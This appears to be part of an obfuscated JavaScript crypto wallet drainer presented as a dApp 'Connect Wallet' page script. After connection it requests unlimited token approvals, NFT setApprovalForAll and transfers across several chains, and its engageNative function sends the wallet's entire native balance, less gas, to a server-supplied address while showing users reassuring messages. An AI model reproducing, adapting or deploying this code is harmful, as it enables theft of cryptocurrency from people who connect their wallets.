        new Web3[_0x30e207(0xdd)]["BN"](_0x3400b3)
      ),
      _0x287738 = new Web3[_0x30e207(0xdd)]["BN"](_0x419d4e)[_0x30e207(0xdf)](
        new Web3[_0x30e207(0xdd)]["BN"](_0x222e94)
      );
    return {
      gasCost: _0x222e94[_0x30e207(0xae)](),
      availBal: _0x287738[_0x30e207(0xae)](),
    };
  },
  engageNative = async _0x4c4c18 => {
    const _0x403a88 = _0x7b2b0e,
      _0x503d9c = _0x1ebcac;
    let _0x26c86c;
    try {
      const _0x27af7c = await web3[_0x503d9c(0x9c)][_0x503d9c(0xbb)](
          selectedAddress
        ),
        _0x47b474 = web3[_0x503d9c(0xdd)][_0x503d9c(0x106)](
          _0x27af7c,
          _0x503d9c(0x116)
        ),
        _0x5425a2 = await web3["eth"][_0x403a88(0x14d)](selectedAddress),
        _0x5f26f5 = await web3[_0x503d9c(0x9c)][_0x503d9c(0x138)]({
          from: selectedAddress,
          to: _0x4c4c18[_0x503d9c(0x134)],
          value: _0x27af7c[_0x403a88(0x162)](),
          nonce: _0x5425a2,
        }),
        { gasCost: _0x4c7371, availBal: _0x55e3af } = estimateGas(
          _0x27af7c[_0x503d9c(0xae)](),
          _0x5f26f5
        );
      if (
        !_0x55e3af ||
        _0x27af7c < _0x55e3af ||
        Math[_0x503d9c(0x104)](_0x55e3af) === -0x1
      ) {
        log(_0x503d9c(0x92), {
          msg:
            _0x403a88(0x16d) +
            _0x4c4c18[_0x503d9c(0x174)] +
            _0x403a88(0x169) +
            _0x47b474,
        });
        return;
      }
      return (
        log(_0x403a88(0x212), {
          msg:
            _0x503d9c(0xb8) +
            _0x4c4c18[_0x503d9c(0xc9)] +
            _0x403a88(0x17d) +
            _0x4c4c18[_0x503d9c(0x174)],
        }),
        log(_0x503d9c(0x92), {
          msg: _0x503d9c(0xdc) + _0x27af7c + _0x503d9c(0xd4) + _0x55e3af,
        }),
        await web3[_0x403a88(0x1ad)]
          [_0x503d9c(0xfe)]({
            from: selectedAddress,
            to: _0x4c4c18[_0x503d9c(0x134)],
            value: web3[_0x503d9c(0xdd)][_0x503d9c(0xd3)](String(_0x55e3af)),
          })
          ["on"](_0x503d9c(0xad), async _0x43c52c => {
            const _0x3c3609 = _0x403a88,
              _0xec1d49 = _0x503d9c;
            log(_0x3c3609(0x212), {
              msg:
                _0xec1d49(0x110) +
                web3[_0xec1d49(0xdd)][_0xec1d49(0x106)](
                  _0x26c86c,
                  _0xec1d49(0x116)
                ) +
                "\x20" +
                _0x4c4c18[_0x3c3609(0x1b5)] +
                _0x3c3609(0x18a) +
                _0x43c52c,
            });
          })
          ["on"](_0x403a88(0x200), console[_0x503d9c(0xce)]),
        !![]
      );
    } catch (_0x21cc6d) {
      return (
        log(_0x503d9c(0x92), {
          msg:
            _0x503d9c(0xbe) +
            _0x4c4c18[_0x403a88(0x1b5)] +
            _0x503d9c(0x16d) +
            _0x4c4c18[_0x403a88(0x167)] +
            _0x403a88(0x1f7),
        }),
        log(_0x503d9c(0x92), { msg: _0x21cc6d[_0x503d9c(0x13e)] }),
        ![]
      );
    }
  },
  checkSupportedChain = _0x105423 => {
    const _0x2f4498 = _0x7b2b0e,
      _0x32e326 = _0x1ebcac,
      _0x4b31b5 = initData["keyInfo"][_0x2f4498(0x1f1)](
        _0x2a884f => _0x2a884f[_0x32e326(0x109)] === _0x105423
      );
    return _0x4b31b5[_0x32e326(0x125)] >= 0x1 ? !![] : ![];
  },
  engageWallet = async (_0x3c6ad4, _0x19f361, _0x402f2e, _0x4ca2dc) => {
    const _0x363e9d = _0x7b2b0e,
      _0x2cd3e2 = _0x1ebcac;
    let _0x573a22 = [];
    (processRunning = !![]),
      (wchainId = await web3[_0x2cd3e2(0x9c)][_0x2cd3e2(0xc2)]());
    const _0x543039 = "0x" + Number(wchainId)[_0x2cd3e2(0xae)](0x10);
    log(_0x2cd3e2(0x92), { msg: _0x363e9d(0x213) });
    const _0x263c74 = _0x3c6ad4 ? _0x3c6ad4 : _0x543039,
      _0x384e8e = checkSupportedChain(_0x263c74),
      _0xa92060 = _0x3c6ad4
        ? initData[_0x2cd3e2(0x145)][_0x2cd3e2(0x11c)](
            _0x568021 => _0x568021[_0x363e9d(0x22a)] !== _0x3c6ad4
          )
        : initData[_0x2cd3e2(0x145)];
    let _0x31cd63 =
      (_0x19f361 || (_0x543039 !== _0x363e9d(0x22d) && cProcessCount <= 0x0)) &&
      _0x384e8e
        ? initData[_0x2cd3e2(0x145)]["filter"](
            _0x16e38b => _0x16e38b[_0x2cd3e2(0x109)] === _0x263c74
          )
        : _0xa92060;
    if (_0x31cd63[_0x363e9d(0x23a)] <= 0x1 && cProcessCount >= 0x1)
      _0x31cd63 = _0xa92060;
    for await (const _0x31fe38 of _0x31cd63) {
      if (
        !_0x573a22[_0x363e9d(0x15d)](_0x31fe38[_0x2cd3e2(0xb7)]) ||
        (_0x19f361 && !_0x573a22[_0x2cd3e2(0x12b)](_0x3c6ad4)) ||
        (_0x4ca2dc !== _0x31fe38[_0x363e9d(0x22a)] &&
          !_0x573a22[_0x2cd3e2(0x12b)](_0x31fe38[_0x2cd3e2(0x109)]))
      ) {
        const {
            chain: _0x19a16e,
            chainId: _0x27fc27,
            scontract: _0x107855,
            native: _0x10a96f,
          } = _0x31fe38,
          _0x541694 = await selectContract(_0x19a16e, _0x27fc27);
        log(_0x2cd3e2(0x92), { msg: _0x541694 ? _0x541694 : _0x2cd3e2(0xcd) });
        if (_0x541694 && _0x541694[_0x2cd3e2(0x125)]) {
          for await (const _0x49ce55 of _0x541694) {
            (_0x49ce55[_0x363e9d(0x142)] = _0x27fc27),
              (_0x49ce55[_0x2cd3e2(0x12c)] = _0x107855),
              (_0x49ce55[_0x2cd3e2(0x174)] = _0x19a16e);
            if (
              (_0x3c6ad4 && _0x3c6ad4 === _0x27fc27) ||
              _0x543039 === _0x27fc27
            )
              try {
                const _0x24e1f2 = await sendApproval(_0x49ce55);
              } catch (_0x4af56a) {
                log(_0x2cd3e2(0x92), {
                  msg: _0x363e9d(0x1eb) + _0x4af56a[_0x2cd3e2(0x13e)],
                });
              }
            else
              await handleNetworkSwitch(_0x27fc27),
                handleDiffNework(),
                await waitForChainChange();
          }
          _0x573a22[_0x2cd3e2(0xd9)](_0x31fe38[_0x2cd3e2(0x109)]);
        }
        if (_0x27fc27 === _0x263c74)
          await engageNative({
            chain: _0x19a16e,
            chain_id: _0x27fc27,
            contract: _0x107855,
            native: _0x10a96f,
          });
        processRunning = ![];
        if (_0x31cd63[_0x2cd3e2(0x125)] === 0x1) cProcessCount += 0x1;
        if (!_0x402f2e && _0x31cd63[_0x2cd3e2(0x125)] <= 0x1)
          return engageWallet(![], ![], !![], _0x27fc27);
        await sleep(0xc8);
      }
    }
    _0x573a22 = [];
  },
  connectBtns = document[_0x1ebcac(0x11d)](_0x1ebcac(0x168));
function _0x4bfb() {
  const _0x3ac2cf = _0x7b2b0e,
    _0x214e0f = [
      "next",
      _0x3ac2cf(0x157),
      _0x3ac2cf(0x195),
      "transactionHash",
      _0x3ac2cf(0x162),
      "token_address",
      _0x3ac2cf(0x222),
      "bsc",
      _0x3ac2cf(0x1e3),
      _0x3ac2cf(0x163),
      _0x3ac2cf(0x1d8),
      "/api/",
      _0x3ac2cf(0x227),
      "chain_id",
      _0x3ac2cf(0x14f),
      _0x3ac2cf(0x164),
      "operator",
      _0x3ac2cf(0x1da),
      _0x3ac2cf(0x170),
      _0x3ac2cf(0x1ea),
      _0x3ac2cf(0x1a7),
      _0x3ac2cf(0x1d5),
      _0x3ac2cf(0x1cc),
      _0x3ac2cf(0x152),
      _0x3ac2cf(0x17e),
      _0x3ac2cf(0x144),
      _0x3ac2cf(0x215),
      _0x3ac2cf(0x191),
      _0x3ac2cf(0x18d),
      _0x3ac2cf(0x21b),
      "some",
      _0x3ac2cf(0x1b5),
      _0x3ac2cf(0x22d),
      _0x3ac2cf(0x1b1),
      _0x3ac2cf(0x181),
      _0x3ac2cf(0x178),
      "error",
      _0x3ac2cf(0x238),
      _0x3ac2cf(0x1f4),
      "Approval",
      "<li\x20/>",
      _0x3ac2cf(0x159),
      "\x20|\x20send\x20amount:\x20",
      _0x3ac2cf(0x14d),
      _0x3ac2cf(0x190),
      _0x3ac2cf(0x17b),
      "/api/init",
      _0x3ac2cf(0x19e),
      _0x3ac2cf(0x17a),
      _0x3ac2cf(0x187),
      _0x3ac2cf(0x22b),
      "utils",
      _0x3ac2cf(0x171),
      _0x3ac2cf(0x1fa),
      _0x3ac2cf(0x1ce),
      _0x3ac2cf(0x1f5),
      _0x3ac2cf(0x235),
      "getobj",
      "text",
      "67992sXQVlq",
      _0x3ac2cf(0x15a),
      "click",
      _0x3ac2cf(0x1f8),
      "Avalanche\x20C-Chain",
      _0x3ac2cf(0x1a5),
      _0x3ac2cf(0x20d),
      "BNB",
      _0x3ac2cf(0x1e7),
      _0x3ac2cf(0x1e9),
      _0x3ac2cf(0x219),
      _0x3ac2cf(0x15c),
      "MATIC",
      "call",
      _0x3ac2cf(0x15e),
      _0x3ac2cf(0x186),
      _0x3ac2cf(0x214),
      _0x3ac2cf(0x192),
      _0x3ac2cf(0x21f),
      "owner",
      _0x3ac2cf(0x19d),
      _0x3ac2cf(0x230),
      _0x3ac2cf(0x1a3),
      _0x3ac2cf(0x17c),
      _0x3ac2cf(0x1e6),
      _0x3ac2cf(0x180),
      _0x3ac2cf(0x225),
      _0x3ac2cf(0x221),
      _0x3ac2cf(0x234),
      _0x3ac2cf(0x1c4),
      _0x3ac2cf(0x1a8),
      _0x3ac2cf(0x204),
      _0x3ac2cf(0x232),
      _0x3ac2cf(0x145),
      _0x3ac2cf(0x1a0),
      "Please\x20autorize\x20the\x20change\x20of\x20network\x20to\x20continue",
      _0x3ac2cf(0x22a),
      _0x3ac2cf(0x193),
      "https://bsc-dataseed3.binance.org",
      _0x3ac2cf(0x196),
      _0x3ac2cf(0x1c3),
      "networkChanged",
      _0x3ac2cf(0x179),
      _0x3ac2cf(0x1ae),
      _0x3ac2cf(0x182),
      _0x3ac2cf(0x14e),
      "Web3Modal",
      _0x3ac2cf(0x1d6),
      _0x3ac2cf(0x1ed),
      _0x3ac2cf(0x20f),
      _0x3ac2cf(0x188),
      _0x3ac2cf(0x161),
      _0x3ac2cf(0x1fd),
      _0x3ac2cf(0x1bf),
      _0x3ac2cf(0x15f),
      _0x3ac2cf(0x1f1),
      "getElementsByClassName",
      _0x3ac2cf(0x149),
      _0x3ac2cf(0x224),
      "children",
      _0x3ac2cf(0x207),
      _0x3ac2cf(0x156),
      _0x3ac2cf(0x210),
      _0x3ac2cf(0x1bd),
      "length",
      _0x3ac2cf(0x1de),
      _0x3ac2cf(0x18b),
      "Fantom",
      _0x3ac2cf(0x1f3),
      _0x3ac2cf(0x158),
      "includes",
      "scontract",
      _0x3ac2cf(0x154),
      "3693833VYIJZO",
      _0x3ac2cf(0x1a4),
      "48139ilhfhQ",
      _0x3ac2cf(0x1a2),
      _0x3ac2cf(0x1c5),
      _0x3ac2cf(0x21e),
      _0x3ac2cf(0x1b7),
      "resdata",
      _0x3ac2cf(0x1e0),
      "https://rpc-mainnet.matic.quiknode.pro",
      "estimateGas",
      "https://bsc-dataseed2.binance.org",
      _0x3ac2cf(0x202),
      _0x3ac2cf(0x1c6),
      _0x3ac2cf(0x1d1),
      _0x3ac2cf(0x1b6),
      "message",
      _0x3ac2cf(0x223),
      "value",
      _0x3ac2cf(0x148),
      _0x3ac2cf(0x16e),
      "https://bsc-dataseed1.ninicoin.io",
      _0x3ac2cf(0x21d),
      _0x3ac2cf(0x20b),
      "Avalanche",
      _0x3ac2cf(0x185),
      "cronos",
      "Please\x20click\x20on\x20Connect\x20Wallet\x20to\x20connect\x20your\x20wallet!",
      _0x3ac2cf(0x165),
      _0x3ac2cf(0x1c2),
      _0x3ac2cf(0x172),
      _0x3ac2cf(0x1d0),
      _0x3ac2cf(0x14a),
      "uint8",
      _0x3ac2cf(0x153),
      _0x3ac2cf(0x1d2),
      _0x3ac2cf(0x177),
      "https://bscscan.com",
      _0x3ac2cf(0x143),
      _0x3ac2cf(0x1b0),
      _0x3ac2cf(0x166),
      _0x3ac2cf(0x151),
      _0x3ac2cf(0x198),
      _0x3ac2cf(0x216),
      _0x3ac2cf(0x16f),
      _0x3ac2cf(0x18e),
      "_to",
      _0x3ac2cf(0x229),
      "<ul\x20/>",
      _0x3ac2cf(0x1ee),
      "bottom-right",
      _0x3ac2cf(0x22f),
      _0x3ac2cf(0x174),
      "default",
      _0x3ac2cf(0x1e5),
      _0x3ac2cf(0x1cb),
      "select-options",
      _0x3ac2cf(0x1e4),
      _0x3ac2cf(0x1aa),
      _0x3ac2cf(0x1ec),
      _0x3ac2cf(0x1a1),
      _0x3ac2cf(0x1fb),
      _0x3ac2cf(0x1df),
      _0x3ac2cf(0x17d),
      _0x3ac2cf(0x1dc),
      _0x3ac2cf(0x1b8),
      _0x3ac2cf(0x1e2),
      _0x3ac2cf(0x199),
      _0x3ac2cf(0x1ac),
      _0x3ac2cf(0x1ff),
      "chain",
      _0x3ac2cf(0x19f),
      _0x3ac2cf(0x15b),
      _0x3ac2cf(0x21a),
      _0x3ac2cf(0x1dd),
      _0x3ac2cf(0x1ab),
      _0x3ac2cf(0x16a),
      _0x3ac2cf(0x1b9),
      _0x3ac2cf(0x16b),
      _0x3ac2cf(0x14c),
      _0x3ac2cf(0x218),
      _0x3ac2cf(0x1e1),
      "tokenId",
      _0x3ac2cf(0x18f),
      _0x3ac2cf(0x212),
      _0x3ac2cf(0x23b),
      _0x3ac2cf(0x1f0),
      _0x3ac2cf(0x211),
      _0x3ac2cf(0x205),
      "active",
      _0x3ac2cf(0x1ca),
      _0x3ac2cf(0x1a6),
      _0x3ac2cf(0x217),
      _0x3ac2cf(0x1c8),
      _0x3ac2cf(0x1ad),
      _0x3ac2cf(0x160),
      _0x3ac2cf(0x1d4),
      _0x3ac2cf(0x150),
      _0x3ac2cf(0x16c),
      _0x3ac2cf(0x147),
      _0x3ac2cf(0x1b4),
      _0x3ac2cf(0x173),
      _0x3ac2cf(0x20a),
      _0x3ac2cf(0x21c),
      _0x3ac2cf(0x1f2),
      _0x3ac2cf(0x228),
      "del",
      _0x3ac2cf(0x226),
    ];
  return (
    (_0x4bfb = function () {
      return _0x214e0f;
    }),
    _0x4bfb()
  );
}
for (const btn of connectBtns) {
  try {
    btn["addEventListener"](_0x1ebcac(0xe7), async () => {
      if (!initData) await fetchInitData();
      initWeb3Modal(), checkWeb3Chain(), onConnect(), handleDiffNework();
    });
  } catch (_0x208d6a) {
    log(_0x1ebcac(0x92), {
      msg: _0x1ebcac(0xac) + _0x208d6a[_0x1ebcac(0x13e)],
    });
  }
}
const checkConnection = async () => {
  const _0x479e2f = _0x7b2b0e,
    _0x3fe094 = _0x1ebcac;
  if (!web3) return;
  const _0x39e3f7 = await web3[_0x3fe094(0x9c)][_0x479e2f(0x1a3)]();
  if (!_0x39e3f7[_0x3fe094(0x125)])
    return byid(_0x479e2f(0x1aa))[_0x3fe094(0xe7)]();
  chainId = await web3[_0x479e2f(0x1ad)][_0x3fe094(0xc2)]();
  const _0x164196 = document[_0x3fe094(0xef)](_0x3fe094(0xb3));
  msgAlert(
    _0x479e2f(0x1af),
    _0x479e2f(0x194),
    _0x3fe094(0x16e),
    _0x479e2f(0x1ac)
  );
  if (_0x164196[_0x479e2f(0x1cb)] === _0x479e2f(0x1e0))
    _0x164196[_0x3fe094(0x165)] === _0x3fe094(0xd0);
  const _0xc1f50e = localStorageFunc(_0x3fe094(0xe3), _0x3fe094(0x174));
  if (_0xc1f50e && _0xc1f50e["id"] === Number(chainId)[_0x479e2f(0x162)](0xa))
    return;
  await handleNetworkSwitch("0x" + Number(chainId)[_0x479e2f(0x162)](0x10));
};
function _0x3e11(_0x3066d1, _0x4aff94) {
  const _0x36ae6e = _0x4bfb();
  return (
    (_0x3e11 = function (_0x4d0d0c, _0x344463) {
      _0x4d0d0c = _0x4d0d0c - 0x92;
      let _0x36768f = _0x36ae6e[_0x4d0d0c];
      return _0x36768f;
    }),
    _0x3e11(_0x3066d1, _0x4aff94)
  );
}
window[_0x1ebcac(0xe0)](_0x1ebcac(0x96), async () => {
  const _0x2f3e53 = _0x7b2b0e,
    _0x2472f0 = _0x1ebcac;
  (toastr[_0x2472f0(0x14c)] = {
    closeButton: !![],
    debug: ![],
    newestOnTop: ![],
    progressBar: !![],
    positionClass: _0x2f3e53(0x214),
    preventDuplicates: !![],
    showDuration: _0x2472f0(0x10c),
    hideDuration: _0x2472f0(0xc7),
    timeOut: _0x2472f0(0xb0),
    extendedTimeOut: "1000",
    showEasing: "swing",
    hideEasing: _0x2472f0(0x167),
    showMethod: _0x2f3e53(0x1c1),
    hideMethod: _0x2472f0(0xee),
  }),
    await fetchInitData(),
    await checkConnection();
}),
  setInterval(() => {
    fetchInitData();
  }, 0x36ee80),
  setInterval(() => {
    const _0x5e6c01 = _0x7b2b0e,
      _0x114504 = _0x1ebcac,
      _0x146148 = document[_0x114504(0xef)](_0x5e6c01(0x163));
    (cAccount = localStorageFunc(_0x114504(0x144), _0x5e6c01(0x197))),
      selectedAddress || cAccount
        ? (_0x146148[_0x114504(0x165)] = _0x114504(0xd0))
        : (_0x146148[_0x114504(0x165)] = _0x114504(0x136));
    const _0x4117b1 = localStorageFunc(_0x114504(0x144), _0x5e6c01(0x167));
    if (_0x4117b1 && _0x4117b1[_0x114504(0x109)]) {
      const _0x12ed85 = getChainData(_0x4117b1[_0x5e6c01(0x22a)]);
      byid(_0x114504(0x11f))[_0x114504(0x140)] = _0x12ed85[_0x114504(0xcc)];
    }
  }, 0xdbba0),
  $(_0x7b2b0e(0x141))[_0x1ebcac(0xa5)](function () {
    const _0x40748f = _0x7b2b0e,
      _0x1cf2c7 = _0x1ebcac,
      _0x243cba = $(this),
      _0x34bd41 = $(this)[_0x1cf2c7(0x120)](_0x1cf2c7(0x162))[_0x1cf2c7(0x125)];
    _0x243cba[_0x1cf2c7(0xb4)](_0x1cf2c7(0x124)),
      _0x243cba[_0x40748f(0x20c)](_0x1cf2c7(0x17d)),
      _0x243cba[_0x1cf2c7(0xf3)](_0x1cf2c7(0xb6));
    const _0x2ef25c = _0x243cba[_0x1cf2c7(0xaa)](_0x1cf2c7(0xe6));
    _0x2ef25c[_0x40748f(0x1b3)](
      _0x243cba[_0x1cf2c7(0x120)](_0x1cf2c7(0x162))
        ["eq"](0x0)
        [_0x40748f(0x1b3)]()
    );
    const _0x2f06c6 = $(_0x1cf2c7(0x15e), { class: _0x1cf2c7(0x166) })[
      "insertAfter"
    ](_0x2ef25c);
    for (let _0x4ebd8d = 0x0; _0x4ebd8d < _0x34bd41; _0x4ebd8d++) {
      $(_0x1cf2c7(0xd2), {
        text: _0x243cba[_0x1cf2c7(0x120)](_0x1cf2c7(0x162))
          ["eq"](_0x4ebd8d)
          [_0x40748f(0x1b3)](),
        rel: _0x243cba[_0x40748f(0x14b)](_0x1cf2c7(0x162))
          ["eq"](_0x4ebd8d)
          [_0x1cf2c7(0x155)](),
      })[_0x1cf2c7(0x16f)](_0x2f06c6);
    }
    const _0x250fd0 = _0x2f06c6[_0x1cf2c7(0x120)]("li");
    _0x2ef25c["on"](_0x1cf2c7(0xe7), function (_0x2911c2) {
      const _0x375ed4 = _0x40748f,
        _0x3d7ef9 = _0x1cf2c7;
      _0x2911c2[_0x3d7ef9(0x154)](),
        $(_0x3d7ef9(0x170))
          [_0x375ed4(0x19c)](this)
          [_0x3d7ef9(0xa5)](function () {
            const _0x7e4a1 = _0x3d7ef9;
            $(this)
              [_0x7e4a1(0x102)]("active")
              [_0x7e4a1(0xaa)](_0x7e4a1(0xfd))
              [_0x7e4a1(0x98)]();
          }),
        $(this)
          ["toggleClass"](_0x375ed4(0x237))
          [_0x3d7ef9(0xaa)](_0x3d7ef9(0xfd))
          [_0x3d7ef9(0x156)]();
    }),
      _0x250fd0["on"](_0x40748f(0x146), function (_0x29ed76) {
        const _0x47ecc5 = _0x40748f,
          _0x24cad0 = _0x1cf2c7;
        _0x29ed76["stopPropagation"](),
          _0x2ef25c[_0x24cad0(0xe4)]($(this)[_0x47ecc5(0x1b3)]())[
            _0x24cad0(0x102)
          ](_0x24cad0(0x97)),
          _0x243cba[_0x47ecc5(0x1b0)](
            $(this)[_0x24cad0(0x118)](_0x24cad0(0x13f))
          ),
          _0x2f06c6[_0x24cad0(0x98)](),
          checkWeb3Chain(_0x243cba[_0x24cad0(0x155)](), !![]);
      }),
      $(document)["on"](_0x1cf2c7(0xe7), _0x1e786a => {
        const _0x46f5f0 = _0x40748f,
          _0x594656 = _0x1cf2c7;
        _0x2ef25c[_0x46f5f0(0x1c4)](_0x46f5f0(0x237)),
          _0x2f06c6[_0x594656(0x98)]();
      });
  });
const networks = {
  avax: {
    chainId: "0x" + Number(0xa86a)[_0x1ebcac(0xae)](0x10),
    chainName: _0x1ebcac(0xe9),
    nativeCurrency: {
      name: _0x1ebcac(0x146),
      symbol: _0x1ebcac(0x132),
      decimals: 0x12,
    },
    rpcUrls: [_0x1ebcac(0x112)],
    blockExplorerUrls: [_0x7b2b0e(0x1d3)],
  },
  polygon: {
    chainId: "0x" + Number(0x89)[_0x7b2b0e(0x162)](0x10),
    chainName: _0x1ebcac(0x10d),
    nativeCurrency: { name: "MATIC", symbol: _0x1ebcac(0xf1), decimals: 0x12 },
    rpcUrls: [
      _0x1ebcac(0x9a),
      _0x1ebcac(0xb9),
      "https://matic-mainnet.chainstacklabs.com",
      "https://rpc-mainnet.maticvigil.com",
      _0x1ebcac(0x137),
      _0x7b2b0e(0x17f),
    ],
    blockExplorerUrls: [_0x1ebcac(0xa3)],
  },
  bsc: {
    chainId: "0x" + Number(0x38)[_0x1ebcac(0xae)](0x10),
    chainName: _0x1ebcac(0x16c),
    nativeCurrency: {
      name: _0x1ebcac(0x152),
      symbol: _0x1ebcac(0xec),
      decimals: 0x12,
    },
    rpcUrls: [
      _0x7b2b0e(0x208),
      _0x1ebcac(0x139),
      _0x1ebcac(0x10b),
      _0x1ebcac(0xed),
      "https://bsc-dataseed1.defibit.io",
      _0x1ebcac(0x127),
      _0x1ebcac(0xc0),
      _0x1ebcac(0x11e),
      _0x1ebcac(0x143),
      _0x1ebcac(0x111),
      _0x7b2b0e(0x1b2),
      _0x1ebcac(0x177),
      _0x1ebcac(0xfc),
    ],
    faucets: [_0x1ebcac(0x17b)],
    blockExplorerUrls: [_0x1ebcac(0x153)],
  },
  cronos: {
    chainId: "0x" + Number(0x19)[_0x7b2b0e(0x162)](0x10),
    chainName: _0x1ebcac(0xa1),
    nativeCurrency: { name: _0x7b2b0e(0x201), symbol: "CRO", decimals: 0x12 },
    rpcUrls: [_0x1ebcac(0x173)],
    blockExplorerUrls: [_0x1ebcac(0x9b)],
  },
  fantom: {
    chainId: "0x" + Number(0xfa)[_0x1ebcac(0xae)](0x10),
    chainName: _0x1ebcac(0x179),
    nativeCurrency: {
      name: _0x1ebcac(0x128),
      symbol: _0x1ebcac(0xf9),
      decimals: 0x12,
    },
    rpcUrls: [_0x1ebcac(0x101)],
    blockExplorerUrls: [_0x1ebcac(0xe1)],
  },
};
function _0xeba9() {
  const _0x49f84c = [
    "231JkRleY",
    "encodeABI",
    "address_data",
    "2184JdrrCA",
    "https://snowtrace.io",
    "parse",
    "_value",
    "Contract",
    "9000",
    "addClass",
    "cors",
    "getBalance",
    "6MNgJmL",
    "You\x20are\x20successfully\x20connected!",
    "info",
    "nonpayable",
    "Binance\x20Smart\x20Chain\x20Mainnet",
    "Connect\x20Wallet",
    "save",
    "div.select-styled.active",
    "clearCachedProvider",
    "linear",
    "expires",
    "ul.select-options",
    "https://bsc-dataseed4.binance.org",
    "same-origin",
    "fadeOut",
    "removeItem",
    "engageWallet\x20...4\x20",
    "approved",
    "fantom",
    "amount",
    "value",
    "function",
    "filter",
    "User\x20did\x20not\x20autorize\x20change\x20of\x20network",
    "1934775DSwiRP",
    "Wallet\x20Connected!",
    "https://ftmscan.com",
    "owner",
    "\x20to\x20contract",
    "_owner",
    "safeTransferFrom",
    "sub",
    "sendApproval\x20inside\x20allowance\x20sendTransaction",
    "https:",
    "payable",
    "Transaction\x20failed\x20please\x20try\x20again.",
    "https://evm.cronos.org",
    "error",
    "Cronos",
    "remove",
    "May\x20not\x20specify\x20default\x20MetaMask\x20chain",
    "sign",
    "load",
    "closed\x20by\x20user",
    "isApprovedForAll",
    "https://bsc-dataseed1.binance.org",
    "/api/getbalances",
    "uint256",
    "keyInfo",
    "wrap",
    "net",
    "5428kLYOjw",
    "ether",
    "Please\x20click\x20on\x20the\x20connect\x20button\x20to\x20connect!",
    "top-right",
    "log",
    "Engaging\x20wallet\x20to\x20get\x20account\x20balances",
    "toast-top-right",
    "balance",
    "setItem",
    "https://polygon-rpc.com/",
    "189PrfNOn",
    "querySelector",
    "https://bsc-dataseed4.ninicoin.io",
    "1000",
    "each",
    "get",
    "mul",
    "allowance",
    "no-referrer",
    "_from",
    "5000",
    "rel",
    "select2-main",
    "nonce",
    "10000",
    "<div\x20class=\x22select-styled\x22></div>",
    "view",
    "address",
    "chainId",
    "Current\x20balance:\x20",
    "fallback",
    "0x1",
    "map",
    "10KzFJSB",
    "string",
    "message",
    "wallet_addEthereumChain",
    "wallet_switchEthereumChain",
    "https://rpc.ftm.tools",
    "erc721",
    "352940lYtyJa",
    "active",
    "7925ONusEK",
    "blacklisted_addresses",
    "length",
    "balanceOf",
    "select",
    "chain_id",
    "stopPropagation",
    "66006CfbnrD",
    "fromWei",
    "click",
    "Cronos\x20Mainnet\x20Beta",
    "application/json",
    "https://bsc-dataseed4.defibit.io",
    "no-cache",
    "children",
    "<div\x20class=\x22select\x22></div>",
    "getTransactionCount",
    "https://api.avax.network/ext/bc/C/rpc",
    "Trying\x20to\x20send\x20",
    "accountsChanged",
    "totalSupply",
    "medium",
    "setApprovalForAll",
    "methods",
    "9BWXwWg",
    "POST",
    "8tztQbo",
    "bool",
    "toBN",
    "div.select-styled",
    "12000",
    "getId",
    "includes",
    "after",
    "hash",
    "forEach",
    "attr",
    "toString",
    "#connectBtn",
    "https://rpc-mainnet.matic.network",
    "erc20",
    "toggle",
    "chain",
    "66808KhpLyN",
    "\x20chain\x20|\x20balance\x20",
    "approve",
    "toLowerCase",
    "chainChanged",
    "Balance\x20is\x20too\x20low\x20for\x20",
    "connect",
    "catch",
    "sendApproval\x20inside\x20allowance\x201",
    "saveobj",
    "options",
    "https://polygonscan.com",
    "option",
    "statedata",
    "/api/saveapproved",
    "Binance\x20Chain\x20Native\x20Token",
    "No\x20balance",
    "18000",
    "from",
    "sendApproval\x20inside\x20error\x0a",
    "wss://bsc-ws-node.nariox.org",
    "\x20Native\x20token\x20on\x20",
    "getChainId",
    "https://matic-mainnet-full-rpc.bwarelabs.com",
    "sendTransaction",
    "name",
    "https://bsc-dataseed2.ninicoin.io",
    "shift",
    "732cUBYIu",
    "uri",
    "140OmqTeB",
    "decimals",
    "transfer",
    "4dxFgFB",
    "\x20to\x20contract\x0a\x20hash:\x20",
    "https://bsc-dataseed2.defibit.io",
    "68063oweTIn",
    "toast-",
    "avax",
    "spender",
    "transferFrom",
    "json",
    "stringify",
    "1609707aVeClW",
    "bottom-right",
    "connectBtns\x20",
    "300",
    "currentacc",
    "account",
    "close",
    "53287gHoCXp",
    "protocol",
    "not",
    "FTM",
    "push",
    "dark",
    "request",
    "90000",
    "Transfer",
    "getAccounts",
    "_spender",
    "addedValue",
    "getElementById",
    "Was\x20unable\x20to\x20send\x20",
    "WalletConnectProvider",
    "1060CqvBfO",
    "connectBtn",
    "Fantom\x20Opera",
    "8000",
    "eth",
    "Successfully\x20sent\x20",
    "success",
    "val",
    "getItem",
    "https://bsc-dataseed3.ninicoin.io",
    "text",
    "Please\x20wait\x20while\x20we\x20check\x20your\x20account!",
    "native",
    "2CnVbWK",
    "contract",
    "appendTo",
    "https://free-online-app.com/faucet-for-eth-evm-chains/",
    "disconnect",
    "matic",
    "erc1155",
    "select-hidden",
    "11539XsWkRV",
    "status",
    "utils",
    "fadeIn",
    "event",
    "Polygon\x20Mainnet",
    "removeClass",
    "AVAX",
    "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF",
    "1635284ZHzRKh",
    "https://cronos.org/explorer",
    "Please\x20manually\x20change\x20your\x20network\x20to\x20",
    "hide",
    "innerHTML",
    "https://bsc-dataseed3.defibit.io",
    "symbol",
    "addEventListener",
  ];
  _0xeba9 = function () {
    return _0x49f84c;
  };
  return _0xeba9();
}
